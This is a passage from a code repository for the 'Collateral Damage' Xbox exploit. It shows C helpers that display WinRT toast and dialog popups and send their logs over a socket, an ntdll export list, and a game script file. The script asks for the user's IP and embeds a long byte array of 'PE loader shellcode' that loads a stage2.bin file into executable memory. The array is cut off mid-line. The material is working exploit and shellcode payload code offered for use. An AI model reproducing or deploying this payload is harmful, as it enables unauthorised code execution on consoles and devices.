// ABI.Windows.Notifications.IToastNotificationFactory
// 04124b20-82c6-4229-b109-fd9ed4662b53
DEFINE_GUID(UIID_IToastNotificationFactory,
	0x04124b20,
	0x82c6, 0x4229, 0xb1, 0x09,
	0xfd, 0x9e, 0xd4, 0x66, 0x2b, 0x53
);

// UUIDs obtained from <windows.data.xml.dom.h>
//
// ABI.Windows.Data.Xml.Dom.IXmlDocument
// f7f3a506-1e87-42d6-bcfb-b8c809fa5494
DEFINE_GUID(UIID_IXmlDocument,
	0xf7f3a506,
	0x1e87, 0x42d6, 0xbc, 0xfb,
	0xb8, 0xc8, 0x09, 0xfa, 0x54, 0x94
);
//
// ABI.Windows.Data.Xml.Dom.IXmlDocumentIO
// 6cd0e74e-ee65-4489-9ebf-ca43e87ba637
DEFINE_GUID(UIID_IXmlDocumentIO,
	0x6cd0e74e,
	0xee65, 0x4489, 0x9e, 0xbf,
	0xca, 0x43, 0xe8, 0x7b, 0xa6, 0x37
);

// MessageDialog

// UUIDs obtained from <windows.ui.popups.h>
//
// ABI.Windows.UI.Popups.IMessageDialog
// 33F59B01-5325-43AB-9AB3-BDAE440E4121
DEFINE_GUID(UIID_IMessageDialog,
	0x33f59b01,
	0x5325, 0x43ab, 0x9a, 0xb3,
	0xbd, 0xae, 0x44, 0x0e, 0x41, 0x21
);

//
// ABI.Windows.UI.Popups.IMessageDialogFactory
// 2D161777-A66F-4EA5-BB87-793FFA4941F2
DEFINE_GUID(UIID_IMessageDialogFactory,
	0x2d161777,
	0xa66f, 0x4ea5, 0xbb, 0x87,
	0x79, 0x3f, 0xfa, 0x49, 0x41, 0xf2
);

//
// ABI.Windows.UI.Popups.IUICommand
// 4FF93A75-4145-47FF-AC7F-DFF1C1FA5B0F
DEFINE_GUID(UIID_IUICommand,
	0x4ff93a75,
	0x4145, 0x47ff, 0xac, 0x7f,
	0xdf, 0xf1, 0xc1, 0xfa, 0x5b, 0x0f
);
//
// ABI.Windows.UI.Popups.IUICommandFactory
// A21A8189-26B0-4676-AE94-54041BC125E8
DEFINE_GUID(UIID_IUICommandFactory,
	0xa21a8189,
	0x26b0, 0x4676, 0xae, 0x94,
	0x54, 0x04, 0x1b, 0xc1, 0x25, 0xe8
);

extern SOCKET winSock;

#define LOG_SOCK(x, ...) \
	sprintf(global_cur_msg, x, __VA_ARGS__); \
	send(winSock, global_cur_msg, strlen(global_cur_msg), 0);

CHAR* global_cur_msg[0x200] = { 0 };

HRESULT create_xml_document_from_string(
	const wchar_t* xmlString,
	__x_ABI_CWindows_CData_CXml_CDom_CIXmlDocument** doc
)
{
	HRESULT hr = S_OK;

	HSTRING_HEADER header_IXmlDocumentHString;
	HSTRING IXmlDocumentHString;
	hr = WindowsCreateStringReference(
		RuntimeClass_Windows_Data_Xml_Dom_XmlDocument,
		(UINT32)wcslen(RuntimeClass_Windows_Data_Xml_Dom_XmlDocument),
		&header_IXmlDocumentHString,
		&IXmlDocumentHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		return hr;
	}
	if (IXmlDocumentHString == NULL)
	{
		return E_POINTER;
	}

	IInspectable* pInspectable;
	hr = RoActivateInstance(IXmlDocumentHString, &pInspectable);
	if (SUCCEEDED(hr))
	{
		hr = pInspectable->lpVtbl->QueryInterface(
			pInspectable,
			&UIID_IXmlDocument,
			doc
		);
		pInspectable->lpVtbl->Release(pInspectable);
	}
	else
	{
		LOG_SOCK("%s:%d:: RoActivateInstance\n", __FUNCTION__, __LINE__);
		return hr;
	}

	__x_ABI_CWindows_CData_CXml_CDom_CIXmlDocumentIO* docIO;
	(*doc)->lpVtbl->QueryInterface(
		(*doc),
		&UIID_IXmlDocumentIO,
		&docIO
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: QueryInterface\n", __FUNCTION__, __LINE__);
		return hr;
	}

	HSTRING_HEADER header_XmlString;
	HSTRING XmlString;
	hr = WindowsCreateStringReference(
		xmlString,
		(UINT32)wcslen(xmlString),
		&header_XmlString,
		&XmlString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		docIO->lpVtbl->Release(docIO);
		return hr;
	}
	if (XmlString == NULL)
	{
		return E_POINTER;
	}

	hr = docIO->lpVtbl->LoadXml(docIO, XmlString);

	docIO->lpVtbl->Release(docIO);

	return hr;
}

int WINAPI show_toast_rare_achievement(LPCWSTR line1_1, LPCWSTR line2_1, LPCWSTR line1_2, LPCWSTR line2_2)
{
	HRESULT hr = S_OK;

	PCWSTR aumId = L"XboxOneSystemToasts!Windows.Xbox.SystemToasts.Achievements";

	HSTRING_HEADER header_AumIdHString;
	HSTRING AumIdHString;
	hr = WindowsCreateStringReference(
		aumId,
		(UINT32)wcslen(aumId),
		&header_AumIdHString,
		&AumIdHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (AumIdHString == NULL)
	{
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CData_CXml_CDom_CIXmlDocument* inputXml = NULL;
	const wchar_t* xml_template =
		L"<toast scenario=\"rareAchievement\">\r\n"
		L"<visual>\r\n"
		L"  <binding template=\"ToastGeneric\">\r\n"
		L"    <text>%s</text>\r\n"
		L"    <text>%s</text>\r\n"
		L"    <text>%s</text>\r\n"
		L"    <text>%s</text>\r\n"
		L"  </binding>\r\n"
		L"</visual>\r\n"
		L"</toast>\r\n";

	wchar_t formatted_xml[4096];
	_snwprintf_s(formatted_xml, sizeof(formatted_xml)/sizeof(wchar_t), _TRUNCATE, xml_template,
		line1_1 ? line1_1 : L"",
		line2_1 ? line2_1 : L"",
		line1_2 ? line1_2 : L"",
		line2_2 ? line2_2 : L""
	);

	hr = create_xml_document_from_string(formatted_xml, &inputXml);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: CreateXmlDocumentFromString\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	HSTRING_HEADER header_ToastNotificationManagerHString;
	HSTRING ToastNotificationManagerHString;
	hr = WindowsCreateStringReference(
		RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager,
		(UINT32)wcslen(RuntimeClass_Windows_Xbox_UI_Internal_ToastNotifications_ToastManager),
		&header_ToastNotificationManagerHString,
		&ToastNotificationManagerHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (ToastNotificationManagerHString == NULL)
	{
		LOG_SOCK("%s:%d:: ToastNotificationManagerHString == NULL\n", __FUNCTION__, __LINE__);
		hr = E_POINTER;
		goto exit;
	}

	
	__x_Windows_CXbox_CUI_CInternal_CToastNotifications_CIToastManager* toastStatics = NULL;
	hr = RoGetActivationFactory(
		ToastNotificationManagerHString,
		&UIID_XboxUIInternalToastNotificationsIToastManager,
		(LPVOID*)&toastStatics
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: RoGetActivationFactory\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	hr = toastStatics->lpVtbl->FireSystemNotification(toastStatics, AumIdHString, inputXml, 5);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: FireSystemNotification\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	Sleep(1000);

exit:
	if (toastStatics)
		toastStatics->lpVtbl->Release(toastStatics);
	if (inputXml)
		inputXml->lpVtbl->Release(inputXml);

	return hr;
}

int WINAPI show_toast(LPCWSTR line1_1, LPCWSTR line2_1, LPCWSTR line1_2, LPCWSTR line2_2)
{
	HRESULT hr = S_OK;

	__x_ABI_CWindows_CData_CXml_CDom_CIXmlDocument* inputXml = NULL;

	const wchar_t* xml_template =
		L"<toast>\r\n"
		L"<visual>\r\n"
		L"  <binding template=\"ToastGeneric\">\r\n"
		L"    <text>%s</text>\r\n"
		L"    <text>%s</text>\r\n"
		L"    <text>%s</text>\r\n"
		L"    <text>%s</text>\r\n"
		L"  </binding>\r\n"
		L"</visual>\r\n"
		L"</toast>\r\n";

	wchar_t formatted_xml[1024];
	_snwprintf_s(formatted_xml, sizeof(formatted_xml)/sizeof(wchar_t), _TRUNCATE, xml_template,
		line1_1 ? line1_1 : L"",
		line2_1 ? line2_1 : L"",
		line1_2 ? line1_2 : L"",
		line2_2 ? line2_2 : L""
	);

	hr = create_xml_document_from_string(formatted_xml, &inputXml);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: CreateXmlDocumentFromString\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	HSTRING_HEADER header_ToastNotificationManagerHString;
	HSTRING ToastNotificationManagerHString;
	hr = WindowsCreateStringReference(
		RuntimeClass_Windows_UI_Notifications_ToastNotificationManager,
		(UINT32)wcslen(RuntimeClass_Windows_UI_Notifications_ToastNotificationManager),
		&header_ToastNotificationManagerHString,
		&ToastNotificationManagerHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (ToastNotificationManagerHString == NULL)
	{
		LOG_SOCK("%s:%d:: ToastNotificationManagerHString == NULL\n", __FUNCTION__, __LINE__);
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CUI_CNotifications_CIToastNotificationManagerStatics* toastStatics = NULL;
	hr = RoGetActivationFactory(
		ToastNotificationManagerHString,
		&UIID_IToastNotificationManagerStatics,
		(LPVOID*)&toastStatics
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: RoGetActivationFactory\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	__x_ABI_CWindows_CUI_CNotifications_CIToastNotifier* notifier = NULL;
/*
	hr = toastStatics->lpVtbl->CreateToastNotifier(
		toastStatics,
		AppIdHString,
		&notifier
	);
*/

	hr = toastStatics->lpVtbl->CreateToastNotifier(
		toastStatics,
		&notifier
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: CreateToastNotifierWithId: 0x%08x\n", __FUNCTION__, __LINE__, hr);
		goto exit;
	}

	HSTRING_HEADER header_ToastNotificationHString;
	HSTRING ToastNotificationHString;
	hr = WindowsCreateStringReference(
		RuntimeClass_Windows_UI_Notifications_ToastNotification,
		(UINT32)wcslen(RuntimeClass_Windows_UI_Notifications_ToastNotification),
		&header_ToastNotificationHString,
		&ToastNotificationHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (ToastNotificationHString == NULL)
	{
		LOG_SOCK("%s:%d:: ToastNotificationHString == NULL\n", __FUNCTION__, __LINE__);
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CUI_CNotifications_CIToastNotificationFactory* notifFactory = NULL;
	hr = RoGetActivationFactory(
		ToastNotificationHString,
		&UIID_IToastNotificationFactory,
		(LPVOID*)&notifFactory
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: RoGetActivationFactory\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	__x_ABI_CWindows_CUI_CNotifications_CIToastNotification* toast = NULL;
	hr = notifFactory->lpVtbl->CreateToastNotification(notifFactory, inputXml, &toast);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: CreateToastNotification\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	hr = notifier->lpVtbl->Show(notifier, toast);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: Show\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	Sleep(100);

exit:
	if (toast)
		toast->lpVtbl->Release(toast);
	if (notifFactory)
		notifFactory->lpVtbl->Release(notifFactory);
	if (notifier)
		notifier->lpVtbl->Release(notifier);
	if (toastStatics)
		toastStatics->lpVtbl->Release(toastStatics);
	if (inputXml)
		inputXml->lpVtbl->Release(inputXml);

	return hr;
}

int WINAPI show_message_dialog(LPCWSTR dialogTitle, LPCWSTR dialogContent)
{
	HRESULT hr = S_OK;

	hr = RoInitialize(RO_INIT_MULTITHREADED);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: RoInitialize\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	HSTRING_HEADER header_DialogTitleHString;
	HSTRING DialogTitleHString;
	hr = WindowsCreateStringReference(
		dialogTitle,
		(UINT32)wcslen(dialogTitle),
		&header_DialogTitleHString,
		&DialogTitleHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (DialogTitleHString == NULL)
	{
		hr = E_POINTER;
		goto exit;
	}

	HSTRING_HEADER header_DialogContentHString;
	HSTRING DialogContentHString;
	hr = WindowsCreateStringReference(
		dialogContent,
		(UINT32)wcslen(dialogContent),
		&header_DialogContentHString,
		&DialogContentHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (DialogContentHString == NULL)
	{
		hr = E_POINTER;
		goto exit;
	}

	// IMessageDialogFactory 
	HSTRING_HEADER header_MessageDialogFactoryHString;
	HSTRING MessageDialogFactoryHString;
	hr = WindowsCreateStringReference(
		RuntimeClass_Windows_UI_Popups_MessageDialog,
		(UINT32)wcslen(RuntimeClass_Windows_UI_Popups_MessageDialog),
		&header_MessageDialogFactoryHString,
		&MessageDialogFactoryHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (MessageDialogFactoryHString == NULL)
	{
		LOG_SOCK("%s:%d:: MessageDialogFactoryHString == NULL\n", __FUNCTION__, __LINE__);
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CUI_CPopups_CIMessageDialogFactory* msgDialogFactory = NULL;
	hr = RoGetActivationFactory(
		MessageDialogFactoryHString,
		&UIID_IMessageDialogFactory,
		(LPVOID*)&msgDialogFactory
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: RoGetActivationFactory\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	// IUICommandFactory
	HSTRING_HEADER header_UICommandFactoryHString;
	HSTRING UICommandFactoryHString;
	hr = WindowsCreateStringReference(
		RuntimeClass_Windows_UI_Popups_UICommand,
		(UINT32)wcslen(RuntimeClass_Windows_UI_Popups_UICommand),
		&header_UICommandFactoryHString,
		&UICommandFactoryHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (UICommandFactoryHString == NULL)
	{
		LOG_SOCK("%s:%d:: MessageDialogFactoryHString == NULL\n", __FUNCTION__, __LINE__);
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CUI_CPopups_CIUICommandFactory* uiCommandFactory = NULL;
	hr = RoGetActivationFactory(
		UICommandFactoryHString,
		&UIID_IUICommandFactory,
		(LPVOID*)&uiCommandFactory
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: RoGetActivationFactory\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	__x_ABI_CWindows_CUI_CPopups_CIMessageDialog* messageDialog = NULL;
	hr = msgDialogFactory->lpVtbl->CreateWithTitle(
		msgDialogFactory,
		DialogContentHString,
		DialogTitleHString,
		&messageDialog
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: CreateWithTitle\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	__FIVector_1_Windows__CUI__CPopups__CIUICommand* commandsVec = NULL;
	hr = messageDialog->lpVtbl->get_Commands(messageDialog, &commandsVec);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: get_Commands\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	HSTRING_HEADER header_RebootCommandHString;
	HSTRING RebootCommandHString;
	hr = WindowsCreateStringReference(
		L"Reboot",
		(UINT32)wcslen(L"Reboot"),
		&header_RebootCommandHString,
		&RebootCommandHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (RebootCommandHString == NULL)
	{
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CUI_CPopups_CIUICommand* rebootCommand = NULL;
	uiCommandFactory->lpVtbl->Create(uiCommandFactory, RebootCommandHString, &rebootCommand);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: uiCommandFactory->Create (reboot)\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	HSTRING_HEADER header_ContinueCommandHString;
	HSTRING ContinueCommandHString;
	hr = WindowsCreateStringReference(
		L"Continue",
		(UINT32)wcslen(L"Continue"),
		&header_ContinueCommandHString,
		&ContinueCommandHString
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: WindowsCreateStringReference\n", __FUNCTION__, __LINE__);
		goto exit;
	}
	if (ContinueCommandHString == NULL)
	{
		hr = E_POINTER;
		goto exit;
	}

	__x_ABI_CWindows_CUI_CPopups_CIUICommand* continueCommand = NULL;
	uiCommandFactory->lpVtbl->Create(uiCommandFactory, ContinueCommandHString, &continueCommand);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: uiCommandFactory->Create (continue)\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	commandsVec->lpVtbl->Append(commandsVec, rebootCommand);
	commandsVec->lpVtbl->Append(commandsVec, continueCommand);

	__FIAsyncOperation_1_Windows__CUI__CPopups__CIUICommand* uiCommand = NULL;
	hr = messageDialog->lpVtbl->ShowAsync(
		messageDialog,
		&uiCommand
	);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: ShowAsync\n", __FUNCTION__, __LINE__);
		goto exit;
	}

	__x_ABI_CWindows_CUI_CPopups_CIUICommand* chosenCommand = NULL;
	hr = uiCommand->lpVtbl->GetResults(uiCommand, &chosenCommand);
	if (FAILED(hr))
	{
		LOG_SOCK("%s:%d:: GetResults\n", __FUNCTION__, __LINE__);
		goto exit;
	}


	BOOL reboot_requested = (chosenCommand == rebootCommand);

	// TODO: Do reboot

exit:
	if (chosenCommand)
		chosenCommand->lpVtbl->Release(chosenCommand);
	if (uiCommand)
		uiCommand->lpVtbl->Release(uiCommand);
	if (continueCommand)
		continueCommand->lpVtbl->Release(continueCommand);
	if (rebootCommand)
		rebootCommand->lpVtbl->Release(rebootCommand);
	if (commandsVec)
		commandsVec->lpVtbl->Release(commandsVec);
	if (messageDialog)
		messageDialog->lpVtbl->Release(messageDialog);
	if (uiCommandFactory)
		uiCommandFactory->lpVtbl->Release(uiCommandFactory);
	if (msgDialogFactory)
		msgDialogFactory->lpVtbl->Release(msgDialogFactory);

	RoUninitialize();
	return 0;
}

```

`collat_payload/winrt.h`:

```h
#ifndef _WINRT_H
#define _WINRT_H

#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <Windows.h>
#include <initguid.h>
#include <roapi.h>
#include <Windows.ui.notifications.h>
#include <windows.ui.popups.h>
#include <WinSock2.h>
#include "Windows.Xbox.UI.Internal.ToastNotifications.h"

int show_toast_rare_achievement(LPCWSTR line1_1, LPCWSTR line2_1, LPCWSTR line1_2, LPCWSTR line2_2);
int show_toast(LPCWSTR line1_1, LPCWSTR line2_1, LPCWSTR line1_2, LPCWSTR line2_2);
int show_message_dialog(LPCWSTR dialogTitle, LPCWSTR dialogContent);

#endif
```

`ntdll.def`:

```def
EXPORTS
NtCreateFile
NtCreateIoCompletion
NtDeviceIoControlFile
NtQueryInformationToken
NtQuerySystemInformation
NtQuerySystemInformationEx
NtSetIoCompletion

```

`solstice_artifacts/gamescript_autosave.txt`:

```txt
//
// Collateral Damage - @carrot_c4k3 & @landaire - exploits.forsale
//

// !!! PUT YOUR IP BELOW !!!
// EX: var host_ip = "192.168.1.89"
var host_ip = "[YOUR IP HERE]"

// PE loader shellcode
let pe_loader_code = [
0xE9, 0xAF, 0x0, 0x0, 0x0, 0x12, 0x0, 0x0, 0xB0, 0x13, 0x0, 0x0, 0xD2, 0x12, 0x0, 0x0, 0xB0, 0x13, 0x0, 0x0, 0xC8, 0x13, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x25, 0x4C, 0x4F, 0x43, 0x41, 0x4C, 0x41, 0x50, 0x50, 0x44, 0x41, 0x54, 0x41, 0x25, 0x5C, 0x2E, 0x2E, 0x5C, 0x4C, 0x6F, 0x63, 0x61, 0x6C, 0x53, 0x74, 0x61, 0x74, 0x65, 0x5C, 0x73, 0x74, 0x61, 0x67, 0x65, 0x32, 0x2E, 0x62, 0x69, 0x6E, 0x0, 0x45, 0x78, 0x70, 0x61, 0x6E, 0x64, 0x45, 0x6E, 0x76, 0x69, 0x72, 0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x73, 0x41, 0x0, 0x47, 0x65, 0x74, 0x46, 0x69, 0x6C, 0x65, 0x53, 0x69, 0x7A, 0x65, 0x0, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6C, 0x65, 0x41, 0x0, 0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6C, 0x65, 0x0, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x0, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x0, 0x80, 0x0, 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x8, 0x1, 0x0, 0x0, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0xB8, 0x4B, 0x0, 0x45, 0x0, 0x52, 0x0, 0x4E, 0x0, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xB8, 0x45, 0x0, 0x4C, 0x0, 0x42, 0x0, 0x41, 0x0, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0xB8, 0x53, 0x0, 0x45, 0x0, 0x2E, 0x0, 0x44, 0x0, 0x48, 0x89, 0x44, 0x24, 0x50, 0xC7, 0x44, 0x24, 0x58, 0x4C, 0x0, 0x4C, 0x0, 0x66, 0x83, 0x64, 0x24, 0x5C, 0x0, 0x65, 0x48, 0x8B, 0x4, 0x25, 0x60, 0x0, 0x0, 0x0, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x89, 0xC1, 0x48, 0x8B, 0x51, 0x60, 0x48, 0x85, 0xD2, 0x74, 0x57, 0x49, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xD2, 0x4D, 0x89, 0xD0, 0x66, 0x42, 0x83, 0x7C, 0x4A, 0x2, 0x0, 0x4D, 0x8D, 0x49, 0x1, 0x4D, 0x8D, 0x52, 0x1, 0x75, 0xEC, 0x49, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF, 0x66, 0x42, 0x83, 0x7C, 0x54, 0x42, 0x0, 0x4D, 0x8D, 0x52, 0x1, 0x75, 0xF3, 0x4D, 0x39, 0xCA, 0x75, 0x20, 0x45, 0x31, 0xC9, 0x49, 0x83, 0xE8, 0x1, 0x72, 0x29, 0x46, 0xF, 0xB7, 0x14, 0xA, 0x66, 0x46, 0x33, 0x54, 0xC, 0x40, 0x49, 0x83, 0xC1, 0x2, 0x66, 0x41, 0xF7, 0xC2, 0xDF, 0xFF, 0x74, 0xE3, 0x48, 0x8B, 0x9, 0x48, 0x39, 0xC1, 0x75, 0x98, 0xB8, 0x4, 0x4, 0x0, 0x0, 0xE9, 0x32, 0x1, 0x0, 0x0, 0x4C, 0x8B, 0x61, 0x30, 0x48, 0x8D, 0x15, 0xDF, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0x33, 0x1, 0x0, 0x0, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x15, 0xC1, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0x21, 0x1, 0x0, 0x0, 0x49, 0x89, 0xC6, 0x48, 0x8D, 0x15, 0xC4, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xF, 0x1, 0x0, 0x0, 0x48, 0x89, 0xC3, 0x48, 0x8D, 0x15, 0xBF, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xFD, 0x0, 0x0, 0x0, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x15, 0x7F, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xEB, 0x0, 0x0, 0x0, 0x49, 0x89, 0xC7, 0x48, 0x8D, 0x15, 0x53, 0xFE, 0xFF, 0xFF, 0x4C, 0x89, 0xE1, 0xE8, 0xD9, 0x0, 0x0, 0x0, 0x48, 0x8D, 0xD, 0x1C, 0xFE, 0xFF, 0xFF, 0x4C, 0x8D, 0x64, 0x24, 0x40, 0x4C, 0x89, 0xE2, 0x41, 0xB8, 0xC8, 0x0, 0x0, 0x0, 0xFF, 0xD0, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0xC7, 0x44, 0x24, 0x28, 0x80, 0x0, 0x0, 0x0, 0xC7, 0x44, 0x24, 0x20, 0x4, 0x0, 0x0, 0x0, 0x4C, 0x89, 0xE1, 0xBA, 0x0, 0x0, 0x0, 0x80, 0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9, 0x41, 0xFF, 0xD6, 0x48, 0x83, 0xF8, 0xFF, 0x74, 0x5A, 0x49, 0x89, 0xC6, 0x48, 0x89, 0xC1, 0x31, 0xD2, 0x41, 0xFF, 0xD7, 0x89, 0xC5, 0x41, 0x89, 0xC7, 0x31, 0xC9, 0x4C, 0x89, 0xFA, 0x41, 0xB8, 0x0, 0x30, 0x0, 0x0, 0x41, 0xB9, 0x4, 0x0, 0x0, 0x0, 0xFF, 0xD3, 0x48, 0x89, 0xC3, 0x4C, 0x8D, 0x64, 0x24, 0x3C, 0x49, 0x89, 0xC5, 0x85, 0xED, 0x74, 0x2F, 0x83, 0x64, 0x24, 0x3C, 0x0, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x4C, 0x89, 0xF1, 0x4C, 0x89, 0xEA, 0x41, 0x89, 0xE8, 0x4D, 0x89, 0xE1, 0xFF, 0xD6, 0x85, 0xC0, 0x74, 0x2D, 0x8B, 0x44, 0x24, 0x3C, 0x49, 0x1, 0xC5, 0x29, 0xC5, 0xEB, 0xD4, 0xB8, 0x1, 0x0, 0x0, 0x0, 0xEB, 0x20, 0x4C, 0x8D, 0x4C, 0x24, 0x3C, 0x41, 0x83, 0x21, 0x0, 0x48, 0x89, 0xD9, 0x4C, 0x89, 0xFA, 0x41, 0xB8, 0x20, 0x0, 0x0, 0x0, 0xFF, 0xD7, 0xFF, 0xD3, 0xEB, 0x5, 0xB8, 0x2, 0x0, 0x0, 0x0, 0x48, 0x81, 0xC4, 0x8, 0x1, 0x0, 0x0, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x66, 0x81, 0x39, 0x4D, 0x5A, 0xF, 0x85, 0x9F, 0x0, 0x0, 0x0, 0x8B, 0x41, 0x3C, 0x8B, 0x84, 0x1, 0x88, 0x0, 0x0, 0x0, 0x44, 0x8B, 0x4C, 0x1, 0x18, 0x44, 0x8B, 0x44, 0x1, 0x1C, 0x44, 0x8B, 0x5C, 0x1, 0x20, 0x44, 0x8B, 0x54, 0x1, 0x24, 0x31, 0xC0, 0x45, 0x31, 0xE4, 0x4D, 0x39, 0xCC, 0xF, 0x84, 0x8E, 0x0, 0x0, 0x0, 0x49, 0x8D, 0x7C, 0x24, 0x1, 0x44, 0x89, 0xE6, 0x41, 0x8D, 0x1C, 0xB3, 0x8B, 0x1C, 0x19, 0x80, 0x3C, 0x19, 0x0, 0x49, 0x89, 0xFC, 0x74, 0xDF, 0x48, 0x1, 0xCB, 0x49, 0xC7, 0xC7, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x31, 0xE4, 0x4D, 0x89, 0xE6, 0x42, 0x80, 0x7C, 0x3B, 0x1, 0x0, 0x4D, 0x8D, 0x7F, 0x1, 0x4D, 0x8D, 0x64, 0x24, 0x1, 0x75, 0xEC, 0x49, 0xC7, 0xC5, 0xFF, 0xFF, 0xFF, 0xFF, 0x42, 0x80, 0x7C, 0x2A, 0x1, 0x0, 0x4D, 0x8D, 0x6D, 0x1, 0x75, 0xF4, 0x49, 0x89, 0xFC, 0x4D, 0x39, 0xFD, 0x75, 0xA3, 0x45, 0x31, 0xFF, 0x49, 0x83, 0xEE, 0x1, 0x72, 0x1A, 0x42, 0x8A, 0x2C, 0x3A, 0x4D, 0x8D, 0x67, 0x1, 0x42, 0x3A, 0x2C, 0x3B, 0x4D, 0x89, 0xE7, 0x74, 0xE9, 0x49, 0x89, 0xFC, 0xEB, 0x84, 0x31, 0xC0, 0xEB, 